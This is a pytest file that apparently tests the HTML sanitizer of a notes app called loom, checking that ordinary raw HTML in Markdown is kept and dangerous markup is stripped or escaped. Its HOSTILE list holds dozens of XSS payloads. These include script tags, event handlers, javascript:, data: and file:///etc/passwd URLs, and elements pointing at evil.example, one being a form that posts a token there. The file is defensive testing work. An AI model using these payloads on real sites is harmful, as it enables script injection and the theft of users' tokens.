"""A Markdown file's raw HTML: what is ordinary is drawn, a frame is drawn only on loom's terms, and no hostile piece of it survives. Every other body keeps escaping it."""

from __future__ import annotations

import json
from html.parser import HTMLParser

import pytest

from loom.files import headings, render_file_markdown, render_notebook
from loom.mailbox import render_body
from loom.raw_html import ATTRIBUTES, EVERYWHERE, FRAME, TAGS, clean, frame_address
from loom.records.store import render_markdown

KINDS = {
    "notes/day1.md": "markdown",
    "notes/day2.md": "markdown",
    "notes/fig.png": "image",
    "notes/clip.mp4": "other",
    "paper/main.tex": "document",
}


def draw(text: str) -> str:
    return render_file_markdown(text, "notes/day1.md", KINDS)


class Written(HTMLParser):
    """The tags and attributes a body comes out with, read as a browser reads them."""

    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.tags: list[tuple[str, dict[str, str]]] = []

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        self.tags.append((tag, {k: v or "" for k, v in attrs}))


def written(body: str) -> list[tuple[str, dict[str, str]]]:
    parser = Written()
    parser.feed(body)
    parser.close()
    return parser.tags


#: Each is a thing a hostile or careless file might write. None of it may come out as anything but allowlisted markup; see `test_nothing_hostile_comes_out`.
HOSTILE = [
    "<script>alert(1)</script>",
    "<SCRIPT SRC=https://evil.example/x.js></SCRIPT>",
    "text <script>alert(1)</script> text",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<img src=x onerror=alert(1)>",
    '<img src="x" ONERROR="alert(1)">',
    "<img src=x onerror\n=alert(1)>",
    "<img/src=x/onerror=alert(1)>",
    '<img src="x"onerror="alert(1)">',
    '<a href="javascript:alert(1)">x</a>',
    '<a href="JaVaScRiPt:alert(1)">x</a>',
    '<a href=" javascript:alert(1)">x</a>',
    '<a href="\tjavascript:alert(1)">x</a>',
    '<a href="java\nscript:alert(1)">x</a>',
    '<a href="java&#x09;script:alert(1)">x</a>',
    '<a href="&#106;avascript:alert(1)">x</a>',
    '<a href="&#x6A&#x61&#x76&#x61script:alert(1)">x</a>',
    '<a href="javascript&colon;alert(1)">x</a>',
    '<a href="vbscript:msgbox(1)">x</a>',
    '<a href="data:text/html,<script>alert(1)</script>">x</a>',
    '<a href="file:///etc/passwd">x</a>',
    '<a href="ms-msdt:/id">x</a>',
    '<img src="javascript:alert(1)">',
    '<img src="data:image/svg+xml,<svg onload=alert(1)>">',
    '<video src="javascript:alert(1)" poster="javascript:alert(2)" autoplay onplay="alert(3)"></video>',
    '<blockquote cite="javascript:alert(1)">x</blockquote>',
    "<svg onload=alert(1)></svg>",
    "<svg><script>alert(1)</script></svg>",
    "<svg><a href='javascript:alert(1)'><text>x</text></a></svg>",
    "<math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>",
    "<details open ontoggle=alert(1)>x</details>",
    "<div onmouseover=alert(1) style='position:fixed;inset:0' class='box'>x</div>",
    "<body onload=alert(1)>",
    "<style>@import 'https://evil.example/x.css'; body{display:none}</style>",
    "<link rel=stylesheet href=https://evil.example/x.css>",
    "<meta http-equiv=refresh content='0;url=https://evil.example/'>",
    "<base href=https://evil.example/>",
    "<object data=https://evil.example/x></object>",
    "<embed src=https://evil.example/x>",
    "<form action=https://evil.example/><input name=token><button>go</button></form>",
    "<textarea><img src=x onerror=alert(1)></textarea>",
    "<title><img src=x onerror=alert(1)></title>",
    "<noscript><img src=x onerror=alert(1)></noscript>",
    "<xmp><img src=x onerror=alert(1)></xmp>",
    "<template><img src=x onerror=alert(1)></template>",
    "<plaintext><img src=x onerror=alert(1)>",
    "<!--><img src=x onerror=alert(1)>-->",
    "<![CDATA[<img src=x onerror=alert(1)>]]>",
    "<?xml version=1.0?><img src=x onerror=alert(1)>",
    '<a title="><img src=x onerror=alert(1)>">x</a>',
    '<a title="$x$<img src=x onerror=alert(1)>">x</a>',
    '<a title="a>$x$<img src=x onerror=alert(1)>">x</a>',
    "<a title='$x\" onmouseover=\"alert(1) loommathx0x$'>x</a>",
    "<a title='loommathx0x' href='$\" onclick=\"alert(1)$'>x</a> $y$",
    '<loommathx0xdata:text/html,/a> $" onclick="alert(1)$',
    "<a title='$x\" onmouseover=\"alert(1)$'>x</a>",
    '<a href="https://e.example/$x" onclick="alert(1)$">x</a>',
    '<img src="x" alt="$y$" onerror="alert(1)">',
    '<div title="\n\n<img src=x onerror=alert(1)>\n\n">',
    "<img src=x onerror=alert(1) ",
    "<iframe src=https://ok.example><img src=x onerror=alert(1)></iframe>",
    '<iframe src="https://ok.example" srcdoc="<script>alert(1)</script>" onload="alert(1)" name="top" sandbox="allow-top-navigation"></iframe>',
    '<iframe src="javascript:alert(1)"></iframe>',
    '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',
    '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
    '<iframe src="https://ok.example"',
    '<a id="x" name="getElementById">x</a>',
]


@pytest.mark.parametrize("text", HOSTILE)
def test_nothing_hostile_comes_out(text: str) -> None:
    """Whatever a file writes, the body holds only allowlisted tags with allowlisted attributes, its URLs on allowed schemes, a frame always on the publisher's terms, and nothing outside it but escaped text; `$...$` around any of it changes nothing."""
    for body in (draw(text), draw(f"Before.\n\n{text}\n\nAfter."), draw(f"- item {text}\n"), draw(f"> {text}\n")):
        for tag, attrs in written(body):
            assert tag in TAGS, body
            # the math the publisher writes itself is the one class in a body
            kept = EVERYWHERE | ATTRIBUTES.get(tag, frozenset()) | {"class"}
            if tag == "iframe":
                assert attrs["src"].startswith("https://ok.example"), body
                assert 'sandbox="allow-scripts allow-same-origin' in body, body
                assert "srcdoc" not in attrs and "allow-top-navigation" not in attrs["sandbox"], body
                continue
            if tag in ("audio", "video"):
                kept |= {"controls"}
            assert set(attrs) <= kept, body
            if "class" in attrs:
                assert attrs["class"] in ("math inline", "math display"), body
            for name in ("href", "src", "poster", "cite"):
                value = "".join(attrs.get(name, "").split()).lower()
                assert not value.startswith(
                    ("javascript:", "vbscript:", "data:text", "data:image/svg", "file:", "ms-msdt:")
                ), body


@pytest.mark.parametrize("value", [">", '"', "'", "<script>", "&quot; onclick=&quot;x"])
def test_a_value_stays_inside_its_attribute(value: str) -> None:
    title = value.replace('"', "&quot;")
    tags = written(draw(f'<kbd title="{title}">x</kbd>'))
    assert tags == [("p", {}), ("kbd", {"title": value.replace("&quot;", '"')})]


def test_a_refused_tag_shows_as_its_own_text_and_a_word_in_angle_brackets_stays_a_word() -> None:
    body = draw(
        'A Vector<T> and <your name>.\n\n<script>go()</script>\n\n<iframe src="http://plain.example/"></iframe>\n'
    )
    assert "Vector&lt;T&gt; and &lt;your name&gt;." in body
    assert "&lt;script&gt;go()&lt;/script&gt;" in body
    assert "&lt;iframe src=&quot;" not in body  # a tag's own quotes are text, shown as they are
    assert '&lt;iframe src="http://plain.example/"&gt;' in body
    assert "<script" not in body and "<iframe" not in body


def test_ordinary_html_is_drawn_with_markdown_and_mathematics_working_around_it() -> None:
    body = draw(
        "A <kbd>key</kbd>, H<sub>2</sub>O, and $x_i$.\n\n"
        '<div align="center">\n\n*Markdown* and $y_i$ inside.\n\n</div>\n\n'
        "<details open>\n<summary>More</summary>\n\nText.\n\n</details>\n\n"
        '<table><tr><td colspan="2" onclick="x()">cell</td></tr></table>\n\n'
        "| a |\n|---|\n| <b>b</b> |\n"
    )
    assert "<kbd>key</kbd>" in body and "H<sub>2</sub>O" in body
    assert r'<span class="math inline">\(x_i\)</span>' in body
    assert (
        '<div align="center">\n<p><em>Markdown</em> and <span class="math inline">\\(y_i\\)</span> inside.</p>\n</div>'
        in body
    )
    assert '<details open="">' in body and "<summary>More</summary>" in body
    assert '<td colspan="2">cell</td>' in body
    assert "<td><b>b</b></td>" in body


def test_markdown_with_no_html_in_it_comes_out_as_it_did() -> None:
    """Only what was written as HTML passes through the allowlist; Markdown's own markup, its link schemes and its code among it, is as Markdown writes it."""
    text = "# Title\n\n[a](x-custom:thing) `<script>` and\n\n```py\n<b>x</b>\n```\n"
    assert draw(text) == render_markdown(text).replace("<h1>", '<h1 id="title">')


def test_a_relative_address_in_html_resolves_as_it_does_in_markdown() -> None:
    body = draw(
        '<a href="day2.md#plan">a</a> <a href="../paper/main.tex">b</a> <a href="gone.md">c</a> <a href="#here">d</a> '
        '<a href="quilt:sy-0001">e</a> <a href="cited:arxiv:0805.2065v2?page=9">f</a> <a href="app:Anki">g</a> '
        '<a href="mailto:a@example.org">h</a> <a href="https://example.org/?a=1&amp;b=2">i</a>\n\n'
        '<img src="fig.png" width="50%" alt="A figure">\n\n<video src="clip.mp4" width="640" height="360" loop></video>\n'
    )
    for href in (
        "quilt:notes/day2.md#plan",
        "quilt:paper/main.tex",
        "gone.md",
        "#here",
        "quilt:sy-0001",
        "cited:arxiv:0805.2065v2?page=9",
        "app:Anki",
        "mailto:a@example.org",
        "https://example.org/?a=1&amp;b=2",
    ):
        assert f'href="{href}"' in body
    assert '<img src="/_files/notes/fig.png" width="50%" alt="A figure">' in body
    # a player always has its controls and never starts itself
    assert '<video src="/_files/notes/clip.mp4" width="640" height="360" loop="" controls></video>' in body


def test_a_youtube_snippet_is_drawn_on_the_publishers_terms() -> None:
    body = draw(
        '<iframe width="560" height="315" src="https://www.youtube.com/embed/abc?si=x&amp;t=1" title="A video" frameborder="0" '
        'allow="accelerometer; autoplay; clipboard-write" referrerpolicy="unsafe-url" allowfullscreen></iframe>\n'
    )
    assert body == (
        '<iframe width="560" height="315" src="https://www.youtube.com/embed/abc?si=x&amp;t=1" title="A video"'
        + FRAME
        + "></iframe>"
    )
    assert "autoplay" not in body and "unsafe-url" not in body and "allow-top-navigation" not in body


def test_a_frame_is_shut_so_nothing_after_it_is_swallowed() -> None:
    """A browser reads what follows an open `<iframe>` as text it never shows; written shut, a file that forgot the close loses nothing."""
    body = draw('<iframe src="https://ok.example/"\n>\n\nAfter it.\n')
    assert body.count("</iframe>") == 1 and "<p>After it.</p>" in body
    assert body.index("</iframe>") < body.index("After it.")


@pytest.mark.parametrize(
    ("value", "address"),
    [
        ("https://www.youtube.com/embed/x", "https://www.youtube.com/embed/x"),
        ("HTTPS://WWW.YOUTUBE.COM/embed/x", "HTTPS://WWW.YOUTUBE.COM/embed/x"),
        ("//www.youtube-nocookie.com/embed/x", "https://www.youtube-nocookie.com/embed/x"),
        (" https://player.vimeo.com/video/1\n", "https://player.vimeo.com/video/1"),
        ("http://www.youtube.com/embed/x", None),
        ("page.html", None),
        ("/_files/notes/page.html", None),
        ("/", None),
        ("", None),
        ("javascript:alert(1)", None),
        ("data:text/html,x", None),
        ("about:blank", None),
        ("https:///x", None),
        ("https:\\\\evil.example", None),
        ("//\\evil.example", None),
        ("https://[bad", None),
    ],
)
def test_a_frame_loads_only_https_on_a_named_host(value: str, address: str | None) -> None:
    assert frame_address(value) == address


def test_a_formula_is_typeset_in_text_and_read_as_written_in_an_attribute() -> None:
    body = draw('<div title="cost $x$ and $$y$$">the $z$ of it</div>\n')
    assert written(body)[0] == ("div", {"title": "cost $x$ and $$y$$"})
    assert r'<span class="math inline">\(z\)</span>' in body


def test_a_formula_inside_a_tag_never_opens_markup_there() -> None:
    """A span lifted out of an attribute comes back as its words, and so does one reached by a word written to look like it, a Markdown link's title and an image's text among them."""
    body = draw('$z" onclick="go()$ <kbd title=\'loommathx0x\'>k</kbd> [a](b "$x$") ![$y$](c.png)\n')
    tags = dict(written(body))
    assert tags["kbd"] == {"title": '$z" onclick="go()$'}
    assert tags["a"] == {"href": "b", "title": "$x$"}
    assert tags["img"] == {"src": "c.png", "alt": "$y$"}


def test_a_comment_is_not_shown() -> None:
    assert draw("<!-- a note to myself -->\n\nText.\n") == "<p>Text.</p>"


def test_a_place_may_be_named_by_a_files_own_html() -> None:
    body = draw('<h2 title="t" id="raw-place">Raw</h2>\n\n## Title <small>x</small>\n\n<a id="not-a-heading"></a>\n')
    assert headings(body) == {"raw-place", "title-x"}


def test_a_notebooks_markdown_cells_are_drawn_as_a_file_is_and_its_html_outputs_are_not() -> None:
    nb = {
        "nbformat": 4,
        "cells": [
            {"cell_type": "markdown", "source": ['<kbd>k</kbd> <img src=x onerror="go()">\n']},
            {
                "cell_type": "code",
                "source": ["x\n"],
                "execution_count": 1,
                "outputs": [{"output_type": "display_data", "data": {"text/html": ["<kbd>out</kbd>"]}}],
            },
        ],
    }
    body = render_notebook(json.dumps(nb), "notes/run.ipynb", {})
    assert "<kbd>k</kbd>" in body and "onerror" not in body
    assert "<kbd>out</kbd>" not in body


@pytest.mark.parametrize("render", [render_markdown, render_body])
def test_every_other_body_keeps_escaping_html(render) -> None:  # noqa: ANN001
    """An annotation, a message, a page or an overview is written by an agent too, and has no need of HTML."""
    body = render('<kbd>x</kbd> <iframe src="https://ok.example/"></iframe>\n\n<div>y</div>\n')
    assert "<kbd" not in body and "<iframe" not in body and "<div" not in body
    assert "&lt;kbd&gt;x&lt;/kbd&gt;" in body


def test_when_the_filter_fails_the_html_is_escaped() -> None:
    def broken(_source: str, _words: object) -> str:
        raise RuntimeError("no")

    assert "<kbd" not in render_markdown("<kbd>x</kbd>", raw=broken)


def test_clean_keeps_a_tag_open_for_a_later_piece_to_close() -> None:
    """Markdown hands an inline tag over alone, so what opens in one piece closes in the next."""

    def same(_name: str, url: str) -> str:
        return url

    assert clean("<b>", same, str) == "<b>"
    assert clean("</b>", same, str) == "</b>"
    assert clean("</script>", same, str) == "&lt;/script&gt;"
    assert clean("<br/>", same, str) == "<br>"
    assert clean("<b/>", same, str) == "<b></b>"
